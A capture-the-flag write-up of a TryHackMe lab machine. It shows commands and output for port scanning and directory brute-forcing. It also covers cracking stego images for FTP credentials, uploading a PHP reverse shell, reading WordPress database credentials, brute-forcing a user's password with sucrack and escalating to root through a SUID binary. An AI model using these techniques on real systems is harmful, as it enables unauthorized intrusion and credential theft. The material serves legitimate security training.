---
title: Different CTF - Writeup
author: Elman Alizadeh
date: 2022-05-28 20:20:00 +0800
categories: [ctf, TryHackMe]
tags: [tryhackme, different,]
---

Today we will take a look at TryHackMe: Different CTF. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/thm-different/1.jpeg" | relative_url }})

## How many ports are open ?

```console
└─$ sudo nmap -p- -Pn -sV -sC --open  10.10.228.157          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-28 18:28 +04
Nmap scan report for 10.10.228.157
Host is up (0.15s latency).
Not shown: 65060 closed tcp ports (reset), 473 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.6
|_http-title: Hello World &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Unix
```

## What is the name of the secret directory ?

When we look at the page, we see that it is damaged.

![Desktop View]({{ "/assets/img/thm-different/2.png" | relative_url }})

When we look at the source code, we see the host name to be added to / etc / host

![Desktop View]({{ "/assets/img/thm-different/3.png" | relative_url }})

Command: sudo nano /etc/hosts

```console
10.10.228.157   adana.thm
```

### Gobuster

```console
Command: gobuster dir -u http://adana.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/announcements        (Status: 301) [Size: 314] [--> http://adana.thm/announcements/]
```

## Web flag ?

When we look at http://adana.thm/announcements/, we see a list of picture and words. Let’s download them.

![Desktop View]({{ "/assets/img/thm-different/4.png" | relative_url }})

### Steghide

```console
Command: stegcracker austrailian-bulldog-ant.jpg wordlist.txt

Password:123adana********

Command: steghide — extract -sf austrailian-bulldog-ant.jpg

Command: cat user-pass-ftp.txt |base64 -d
```

USER: hakanftp
PASS: 123adana*****

### FTP

```console
Command: ftp IP
```
![Desktop View]({{ "/assets/img/thm-different/5.png" | relative_url }})

Let’s add a php reverse shell to the folder we see when we log in.

```console
Command: put reverseshell.php

Command: chmod 777 reverseshell.php
```
But I couldn’t get the shell when I wrote http: //adana.thm/reverseshell.php

![Desktop View]({{ "/assets/img/thm-different/6.png" | relative_url }})

To do this, I downloaded the wp-config file and looked at its contents.

```console
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '12345' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

http://adana.thm/phpmyadmin/

Select wp_options in phpmyadmin1 when accessing the panel. Here we see another subdomain

![Desktop View]({{ "/assets/img/thm-different/7.png" | relative_url }})

Command: sudo nano /etc/hosts

```console
10.10.228.157   adana.thm  subdomain.adana.thm
```
Now let’s take the shell

![Desktop View]({{ "/assets/img/thm-different/8.png" | relative_url }})

After logging in

```console
Command: script /dev/null -c bash

Command: export TERM=xterm

Ctrl+z                             
Command: stty raw -echo ; fg                            
Command: reset

Command: cat /var/www/html/wwe3bbfla4g.txt
```

## Hakanbey 

We will find the password of this username with bruteforce. We must first prepare a list for this. The first two passwords we found have the inscription ‘123adana’ in front of them. Let’s write them in front of the words on the list we have. I wrote code that will do this with Python:

```console
file = open('wordlist.txt', 'r')
file1 = open('new.txt', 'w')
for line in file:
       b = '123adana' + line
       file1.write(b)
file.close()
file1.close()
```

After running the code, you need a tool to check them one by one. Therefore, we will use the sucrack tool.

[pkgs.org](https://pkgs.org/download/sucrack)

Command: wget http://archive.ubuntu.com/ubuntu/pool/universe/s/sucrack/sucrack_1.2.3-6_amd64.deb

In local machine:

Command: python3 -m http.server 80

In target machine:
```console
Command: wget 10.8.223.65/sucrack_1.2.3–6_amd64.deb

Command: dpkg -x sucrack_1.2.3–6_amd64.deb sucrack

Command: mkdir brute

Command: cd brute/

Command: cp /tmp/hakanbey/sucrack/usr/bin/sucrack .

Command: cp /tmp/hakanbey/new.txt .

Command: ./sucrack -w 100 -b 500 -u hakanbey new.txt

Password: 123adana*****
```


```console
Command: cat /home/hakanbey/user.txt
```

## Root

Command: find / -perm -u=s 2>/dev/null

There is an additional parameter here. Let’s start it now and see what operation is going on behind it.

```console
hakanbey@ubuntu:/$ ltrace ./usr/bin/binary
```
![Desktop View]({{ "/assets/img/thm-different/9.png" | relative_url }})

Password: warzone*************

```console
hakanbey@ubuntu:/$ /usr/bin/binary
/usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg
```

Let’s copy the root.jpg image to our local machine.

In target machine:

Command: python3 -m http.server 8000

In local machine

Command: wget http://10.10.228.157:8000/root.jpg


![Desktop View]({{ "/assets/img/thm-different/10.png" | relative_url }})

When looking at the given tip, you should look at the hex codes of the image, you need to decode the hex codes in the order 00000020

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex%28%27Auto%27%29To_Base85%28%27!-u%27,false%29&input=RkUgRTkgOUQgM0QgIDc5IDE4IDVGIEZDICAgODIgNkQgREYgMUMgIDY5IEFDIEMyIDc1)

![Desktop View]({{ "/assets/img/thm-different/11.png" | relative_url }})

Command: su root

![Desktop View]({{ "/assets/img/thm-different/12.png" | relative_url }})

### And now we are the root Babba ;)

![Desktop View]({{ "/assets/img/thm-different/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”

